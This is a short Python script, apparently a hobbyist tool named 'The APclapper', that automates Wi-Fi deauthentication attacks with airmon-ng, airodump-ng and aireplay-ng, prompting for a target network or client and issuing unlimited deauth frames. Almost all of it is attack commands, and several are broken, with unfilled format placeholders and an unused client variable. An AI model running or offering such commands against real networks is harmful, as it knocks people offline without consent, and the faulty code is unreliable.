import os
os.system("git pull")
print ("if you want to exit the program just press CTRL and c to stop")
print ("when running airodump-ng just press ctrl c to stop")
os.system("airmon-ng start wlan0")
os.system("airodump-ng wlan0mon")
x = raw_input("enter the bssid that you want to CLAP!:")
e = raw_input("enter the channel of the channel you wanna CLAP!:")
os.system("airodump-ng --channel %s --bssid %s wlan0mon")
aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
if aireplay == 'Network':
  os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
else:
  aireplay_client = raw_input("enter the client you wanna CLAP:")
command = "aireplay-ng -0 0 -a %s -c  wlan0mon"
print ("copy the command below and paste it in the terminal")
print(command % x)
print ("The APclapper...")
